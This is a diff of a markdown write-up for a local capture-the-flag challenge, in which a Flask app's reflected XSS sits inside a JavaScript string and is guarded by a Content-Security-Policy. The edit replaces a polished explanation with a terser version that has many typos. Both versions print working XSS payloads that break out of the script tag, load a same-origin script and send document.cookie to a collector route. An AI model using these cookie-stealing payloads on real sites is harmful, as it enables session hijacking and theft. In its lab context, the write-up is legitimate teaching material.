@@ -46,149 +46,66 @@ A tiny Flask app with three routes:
 - `GET /admin` — sets the flag as a cookie: `flag=flag{xss_csp}; Path=/; Secure`
 - `GET /c` — “collector” that logs whatever arrives in the c query param to the server console.
 
-Each response adds a `Content-Security-Policy: default-src 'self'; script-src 'self'`. This is because it blocks incline scripts and allows external scripts. 
+Each response adds a `Content-Security-Policy: default-src 'self'; script-src 'self'`. This is because it blocks incline scripts and allows external scripts. As a result, the attack runs by loading a self‑hosted external script. The reason why XSS can occur in this task is because this is a reflected XSS using JavaScript strings, executed via a same-oridin external script comply with CSP. It is reflected because it is immediately sent to the servers response and nothing is stored. The vulnerability is because the page escapes q for input value in index and then injects q straight into javascript. The example in the code is too long so here is a simplified example below. 
 
-
-
-
-
-**CSP.**
-Every response adds `Content-Security-Policy: default-src 'self'; script-src 'self'`.
-This **blocks inline scripts** (no `'unsafe-inline'`), but **allows external scripts** loaded from the same origin.
-
-**Where the bug is.**
-
-* The page escapes `q` **for the input value** via `safe = ...replace(...)`, but then **injects raw `q` into JavaScript**:
-
-  ```python
-  "<script>"
+```python
+    "<script>"
     "let query = \"" + q + "\";"
     "console.log('User searched:', query);"
-  "</script>"
-  ```
-
-  Because only `& < > "` were escaped (for HTML), the JavaScript string can be **broken** with `"` (double‑quote) and a `;`. Example raw payload fragment: `";alert(1)//`.
-
-* However, CSP forbids inline execution, so a one‑liner `alert(1)` **won’t run**. We must:
-
-  1. **Break the JS string**, then **break out of the inline `<script>`**, and
-  2. **Inject a new external `<script src=...>`** that the CSP will allow (same origin).
-
-**Cookie/transport detail.**
-`/admin` marks the cookie **Secure** → browsers only send it over **HTTPS**. For a realistic challenge, you should run Flask with TLS:
-
-```python
-app.run(host="0.0.0.0", port=5000, debug=True, ssl_context="adhoc")
+    "</script>"
 ```
 
-(If you can’t use HTTPS locally, drop `; Secure` temporarily during testing, but keep it for the challenge.)
+Because of te filter used so that code works for HTML, there are some string that can still break the task with an example playload in `";alert(1)//`.
 
-**External helper (recommended).**
-Expose a same‑origin script that exfiltrates cookies using a benign request (allowed by CSP):
 
-```python
-@app.route("/x.js")
-def xjs():
-    return (
-        "new Image().src='/c?c='+encodeURIComponent(document.cookie);",
-        200,
-        {"Content-Type": "application/javascript"},
-    )
+Howeverm because of the use of the Content Security Policy (CSP) which is a security feature that helps stop Cross-Site Scripting (XSS) attacks by controlling the resources a browser is allowed to load for a web page, inline JS does not work, an example of a failing test that would usually work is
+```JavaScript
+";fetch('/c?c='+document.cookie)//
 ```
+But it does not work in this instance. 
 
-*Why this design increases difficulty.*
+This forces solvers to understand the line of JS string → HTML end‑script → external script. This means that the task requires the user to break the JS string, then break the inline script and finally inject a new external script. 
 
-* The **manual HTML escaping** hides obvious HTML‑context XSS but leaves a **JS‑string context** open.
-* **CSP** removes inline execution paths, forcing solvers to understand **context switches** (JS string → HTML end‑script → external script) and **same‑origin policy**.
-* Marking the cookie **Secure** forces correct **transport** (HTTPS) or a conscious testing change.
 
 ---
 
 ### Solution Section
 
-**Goal:** Read the `flag` cookie and send it to `/c` so it appears in server logs (`Stolen: ...`).
 
-#### 0) Prep
+0. Run the server
+- Use python3 app.py in web-xss-csp
+- Make sure that all depencies are present
+- head to the home page `https://127.0.0.1:5000`
 
-* Run the server with TLS so Secure cookies work:
+1. Plan the injection
+- Context is inside `let query = "<HERE>";` so it breaks the string with `"` and then ;. close the script with `</script>`
+- Insert an external `<script src="/x.js"></script>` that runs and executes
+```js
+new Image().src='/c?c='+encodeURIComponent(document.cookie);
+```
+which issues a GET to `/c?c=<cookie>`, and the server prints `Stolen: ...`.
 
-  ```python
-  app.run(host="0.0.0.0", port=5000, debug=True, ssl_context="adhoc")
-  ```
-* Visit **`https://127.0.0.1:5000/admin`** to set the cookie (allow the self‑signed cert warning).
 
-#### 1) Plan the injection
+2. Payload - URL-encoded
 
-* Context is **inside** `let query = "<HERE>";` → break the string with `"` then `;`.
-* Close the current `<script>` with `</script>`.
-* Insert an **external** `<script src="/x.js"></script>` (CSP allows `'self'`).
-* The external `/x.js` runs and executes:
-
-  ```js
-  new Image().src='/c?c='+encodeURIComponent(document.cookie);
-  ```
-
-  which issues a GET to `/c?c=<cookie>`, and the server prints `Stolen: ...`.
-
-#### 2) Payload (URL‑encoded)
-
+**Encoded**
 ```
 /?q=%22%3B%3C%2Fscript%3E%3Cscript%20src%3D%2Fx.js%3E%3C%2Fscript%3E
 ```
 
-**Decoded payload** (for understanding):
+**Decoded**
 
 ```html
 ";</script><script src=/x.js></script>
 ```
 
-#### 3) Execute and observe
+3. Execute the payload
 
-* Visit: **`https://127.0.0.1:5000/?q=%22%3B%3C%2Fscript%3E%3Cscript%20src%3D%2Fx.js%3E%3C%2Fscript%3E`**
-* Server console log shows:
+Using the website `https://127.0.0.1:5000/?q=%22%3B%3C%2Fscript%3E%3Cscript%20src%3D%2Fx.js%3E%3C%2Fscript%3E`
 
-  ```
-  Stolen: flag{xss_csp}
-  ```
-
----
-
-#### Why simpler payloads failed
-
-* **Inline JS** like `";fetch('/c?c='+document.cookie)//` is **blocked by CSP** (`script-src 'self'`).
-* A raw `<script src="/c?c='+document.cookie">` **doesn’t evaluate** `'+document.cookie'` (it’s an HTML attribute, not JS). You need **actual script execution** to compute `document.cookie` and build the URL.
-* Using **HTTPS** matters because the cookie is **Secure**; over HTTP, the browser may not set/send it, and you’ll see nothing in `/c`.
-
----
-
-#### Alternative demo modes (for local testing only)
-
-* **Temporarily drop `Secure`** on the cookie:
-
-  ```python
-  resp.headers['Set-Cookie'] = "flag=" + FLAG + "; Path=/"
-  ```
-
-  (Works over HTTP, but less realistic.)
-
-* **Temporarily allow inline** (faster, less realistic):
-
-  ```python
-  resp.headers['Content-Security-Policy'] = "default-src 'self'; script-src 'self' 'unsafe-inline'"
-  ```
-
-  Then a one‑liner like:
-
-  ```
-  /?q=%22%3Bfetch('/c?c='%2Bdocument.cookie)//
-  ```
-
-  will work. Restore CSP afterward.
-
-
-
-
-
+```
+Stolen: flag{xss_csp}
+```
 
 
 ---
